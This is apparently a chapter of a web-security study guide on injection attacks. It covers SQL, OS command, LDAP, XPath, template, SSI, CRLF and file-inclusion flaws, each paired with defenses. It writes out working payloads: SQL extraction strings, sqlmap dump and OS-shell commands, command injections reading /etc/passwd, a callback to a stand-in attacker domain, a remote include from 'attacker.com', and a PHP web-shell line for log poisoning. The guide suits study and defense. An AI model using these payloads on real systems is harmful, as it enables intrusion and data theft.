# 04 — Injection Attacks

> Injection is what happens when an application builds a command/query/template by concatenating trusted code with untrusted input, and the interpreter can't tell where one ends and the other begins. This file covers SQL injection (in depth, since it's the highest-impact and most common), OS command injection, LDAP injection, XPath injection, Server-Side Template Injection (SSTI), Server-Side Includes (SSI) injection, CRLF injection, and file inclusion (LFI/RFI).

## Table of Contents
- [SQL Injection](#sql-injection)
- [OS Command Injection](#os-command-injection)
- [LDAP Injection](#ldap-injection)
- [XPath Injection](#xpath-injection)
- [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
- [Server-Side Include (SSI) Injection](#server-side-include-ssi-injection)
- [CRLF Injection](#crlf-injection)
- [Local & Remote File Inclusion (LFI/RFI)](#local--remote-file-inclusion-lfirfi)
- [Defending Against Injection (Summary)](#defending-against-injection-summary)

---

## SQL Injection

**Root cause:** user input is concatenated directly into a SQL query string instead of being passed as a parameter, so attacker-controlled input can change the query's logical structure.

**Classic authentication-bypass example:**
```sql
-- Intended query
SELECT * FROM users WHERE username = '$user' AND password = '$pass';

-- Attacker submits username = admin'-- 
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything';
-- Everything after -- is now a SQL comment; the password check never runs.
```

**Classic numeric-field example:**
```sql
SELECT * FROM tablename WHERE UserID = 2302
-- becomes, with input "2302 OR 1=1":
SELECT * FROM tablename WHERE UserID = 2302 OR 1=1
-- "1=1" is always true, so the query returns every row in the table.
```

### Types of SQL Injection

| Type | How it works | Typical use |
|---|---|---|
| **In-band / Union-based** | Attacker adds a `UNION SELECT` to pull extra columns directly into the visible output | Fastest way to dump data when output is reflected |
| **In-band / Error-based** | Deliberately malformed input triggers a verbose DB error containing extracted data | Useful when the app echoes DB errors |
| **Blind — Boolean-based** | Injects a condition and observes a true/false difference in the response (different page, different text) | Used when no data or errors are shown, but page content still varies |
| **Blind — Time-based** | Injects a conditional `SLEEP()`/`WAITFOR DELAY` and measures response time | Used when the response is otherwise identical regardless of the condition |
| **Out-of-band (OOB)** | Triggers the DB to make a DNS/HTTP request to an attacker-controlled listener, exfiltrating data via that side channel | Used when in-band and blind channels are both unavailable (e.g., heavily filtered output) |

**Manual union-based walkthrough:**
```sql
' ORDER BY 1--                        -- increment until an error tells you the column count
' UNION SELECT NULL,NULL,NULL--        -- match the column count with NULLs
' UNION SELECT username,password,NULL FROM users--   -- pull real data into the output
```

**Manual boolean-blind walkthrough:**
```sql
' AND 1=1--    -- page behaves normally (condition true)
' AND 1=2--    -- page behaves differently (condition false) → confirms the injection point
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--   -- extract one character at a time
```

**Manual time-blind walkthrough (MySQL):**
```sql
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)--
```

### Automating SQL Injection with sqlmap

`sqlmap` is the de facto standard tool for detecting and exploiting SQL injection.

```bash
# Basic detection against a GET parameter
sqlmap -u "https://target.com/item?id=2" --batch

# Specify which parameter to test explicitly
sqlmap -u "https://target.com/item?id=2&cat=5" -p id --batch

# Test a POST request (capture the request in Burp first, save as request.txt)
sqlmap -r request.txt --batch

# Include cookies for an authenticated area
sqlmap -u "https://target.com/account?id=2" --cookie="session=abc123" --batch

# Enumerate databases once injection is confirmed
sqlmap -u "https://target.com/item?id=2" --dbs

# Enumerate tables in a specific database
sqlmap -u "https://target.com/item?id=2" -D shopdb --tables

# Dump a specific table
sqlmap -u "https://target.com/item?id=2" -D shopdb -T users --dump

# Increase aggressiveness / use a specific technique
sqlmap -u "https://target.com/item?id=2" --level=5 --risk=3 --technique=BEUST

# Attempt to read a file from the DB server's filesystem (requires FILE privilege, MySQL example)
sqlmap -u "https://target.com/item?id=2" --file-read="/etc/passwd"

# Attempt to get an interactive OS shell (requires high privileges + stacked queries support)
sqlmap -u "https://target.com/item?id=2" --os-shell
```
`--batch` accepts sqlmap's default answer to every prompt (non-interactive mode, useful for scripting). `--level` and `--risk` (1–5 and 1–3 respectively) control how many payload variations sqlmap tries and how "risky" (potentially destructive/detectable) they are.

### What a Successful SQL Injection Enables an Attacker To Do
- Authenticate without valid credentials
- Read data the application would never normally expose
- Modify or delete database contents
- Pivot into other databases reachable via the same DB server's trust relationships
- In the worst case (stacked queries + high privilege DB account), execute OS commands via the database server itself

## OS Command Injection

**Root cause:** user input is passed to a system shell call (e.g., `system()`, `exec()`, `popen()`, backticks) without sanitization, so shell metacharacters let an attacker chain additional commands.

**Vulnerable pattern (PHP example):**
```php
<?php
system("ping -c 4 " . $_GET['host']);
?>
```
**Exploitation:**
```
GET /ping.php?host=127.0.0.1;whoami
GET /ping.php?host=127.0.0.1 && cat /etc/passwd
GET /ping.php?host=127.0.0.1 | id
GET /ping.php?host=`id`
GET /ping.php?host=$(id)
```
Shell metacharacters worth trying: `; | & && || $() \`\`` `%0a` (newline in URL-encoded form) — different shells and injection contexts respond to different separators.

**Blind command injection (no output returned) — confirm via time delay:**
```
GET /ping.php?host=127.0.0.1;sleep 10
```
**Blind command injection — confirm via out-of-band DNS callback:**
```
GET /ping.php?host=127.0.0.1;nslookup attacker-controlled-domain.com
```

## LDAP Injection

**Root cause:** user input is inserted directly into an LDAP search filter, letting an attacker alter the filter's logic — conceptually identical to SQL injection but against a directory service (Active Directory, OpenLDAP) instead of a relational database.

**Vulnerable pattern:**
```
(&(uid=$username)(userPassword=$password))
```
**Exploitation — authentication bypass:**
```
username = *)(uid=*))(|(uid=*
```
This transforms the filter into something that matches the first entry in the directory regardless of the real credential, because the injected `*` wildcards and extra parentheses restructure the boolean logic.

**Defenses:** use parameterized LDAP APIs (never string-concatenate filters), escape special LDAP filter characters (`( ) * \ NUL`), and enforce least-privilege bind accounts for the application's own directory queries.

## XPath Injection

**Root cause:** identical concept, but against an **XPath** query used to search an XML document (common where XML is used as a lightweight datastore).

**Vulnerable pattern:**
```
//user[username/text()='$username' and password/text()='$password']
```
**Exploitation:**
```
username = ' or '1'='1
```
Produces:
```
//user[username/text()='' or '1'='1' and password/text()='']
```
— which matches the first user node regardless of credentials.

## Server-Side Template Injection (SSTI)

**Root cause:** user input is embedded directly into a server-side template string (Jinja2, Twig, Freemarker, Velocity, Smarty) and then rendered, instead of being passed as *data* to the template. Because template engines support expressions and sometimes arbitrary code execution, this can escalate all the way to remote code execution.

**Detection — polyglot probes:**
```
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
```
If the rendered output shows `49` instead of the literal string, the input is being evaluated as a template expression, not displayed as plain text.

**Exploitation example (Jinja2/Flask — illustrative of the technique's severity, not a copy-paste attack tool):**
```
{{ config.items() }}                                     # leak app configuration
{{ ''.__class__.__mro__[1].__subclasses__() }}            # explore available Python classes
```
The specific gadget chain needed to reach code execution differs by template engine and sandboxing configuration; the key takeaway for a defender is: **never render user input as a template — only ever pass it as a template *variable*.**

## Server-Side Include (SSI) Injection

**Root cause:** a web server with SSI enabled interprets special directive syntax embedded in HTML comments (`<!--#directive -->`); if user input reaches a page that's processed for SSI, an attacker can inject their own directives.

**Example payload:**
```html
<!--#exec cmd="/bin/id" -->
<!--#include virtual="/etc/passwd" -->
```
**Defenses:** disable SSI on any endpoint that doesn't explicitly need it, disable the `exec` directive specifically even where SSI must remain enabled, and validate/encode any input that could end up inside SSI-processed content.

## CRLF Injection

**Root cause:** unsanitized input containing carriage-return/line-feed (`\r\n`, URL-encoded as `%0d%0a`) is inserted into an HTTP header or log line, letting an attacker inject additional headers or split the response entirely.

**HTTP response splitting example:**
```
GET /redirect?url=http://target.com%0d%0aSet-Cookie:%20session=attacker-controlled HTTP/1.1
```
If reflected into a `Location` header unsanitized, the attacker can inject an arbitrary additional header (here, planting a cookie) or, taken further, split the response into two, effectively poisoning what the next request on that connection receives (relevant to [web cache poisoning](./08-other-web-app-attacks.md)).

**Log injection variant:** an attacker submits a username containing `\r\n` plus a forged log line, so when an administrator reviews logs, fabricated entries appear indistinguishable from real ones — useful for covering tracks or framing another user.

**Defenses:** strip/reject `\r` and `\n` from any input that's placed into a header or log line, use framework APIs that set headers safely (which typically reject embedded CRLF automatically), URL-encode redirect targets.

## Local & Remote File Inclusion (LFI/RFI)

**Root cause:** an application uses user-supplied input to build a filesystem path or URL that's passed to a file-include function (`include()`, `require()` in PHP, or equivalent in other languages) without restricting it to an allow-list of legitimate files.

**Vulnerable pattern (PHP):**
```php
<?php
include($_GET['page'] . '.php');
?>
```

**Local File Inclusion (LFI) — directory traversal to read local files:**
```
GET /index.php?page=../../../../etc/passwd%00
GET /index.php?page=....//....//....//....//etc/passwd
```
(`%00` null-byte truncation worked against older PHP versions to strip the appended `.php` extension; modern PHP is not vulnerable to null-byte truncation, but path traversal itself remains relevant wherever extension-appending logic exists.)

**LFI → RCE escalation via log poisoning:** if an attacker can get PHP code into a file the server can read (e.g., inject `<?php system($_GET['cmd']); ?>` into the web server's own access log via a crafted `User-Agent` header), then including that log file via the LFI executes the injected code.

**Remote File Inclusion (RFI) — including a file from an attacker-controlled server (only works if `allow_url_include` is enabled, which is off by default in modern PHP):**
```
GET /index.php?page=http://attacker.com/shell.txt?
```

**Defenses:** never pass user input directly to an include/require function; map input to an allow-list of known-good filenames server-side; disable `allow_url_include` and `allow_url_fopen`; run the application under a restricted account with `open_basedir` set to the application's own directory tree.

## Defending Against Injection (Summary)

| Attack | Primary Defense |
|---|---|
| SQL Injection | Parameterized queries / prepared statements, ORM with parameter binding, least-privilege DB account |
| Command Injection | Avoid shell invocation entirely (use language-native APIs); if unavoidable, use an argument array (never a concatenated string) and an allow-list of permitted values |
| LDAP Injection | Parameterized LDAP filters, character escaping, least-privilege bind account |
| XPath Injection | Parameterized XPath queries (`XPath.setXPathVariableResolver` equivalents) |
| SSTI | Never render user input as a template; only pass it as data |
| SSI Injection | Disable SSI/`exec` where not explicitly required; sanitize any input reflected into SSI-processed pages |
| CRLF Injection | Strip/reject `\r`/`\n` before writing to headers or logs; use safe header-setting APIs |
| LFI/RFI | Allow-list valid filenames; disable `allow_url_include`; apply `open_basedir` restrictions |

A deeper, per-category countermeasure checklist (including WAF rules and secure-coding patterns) is in [10 — Countermeasures & Secure Coding](./10-countermeasures-and-secure-coding.md).

---

**Previous:** [← 03 — Footprinting & Reconnaissance](./03-footprinting-and-recon.md) · **Next:** [05 — XSS, CSRF & Client-Side Attacks →](./05-xss-csrf-and-client-side-attacks.md)
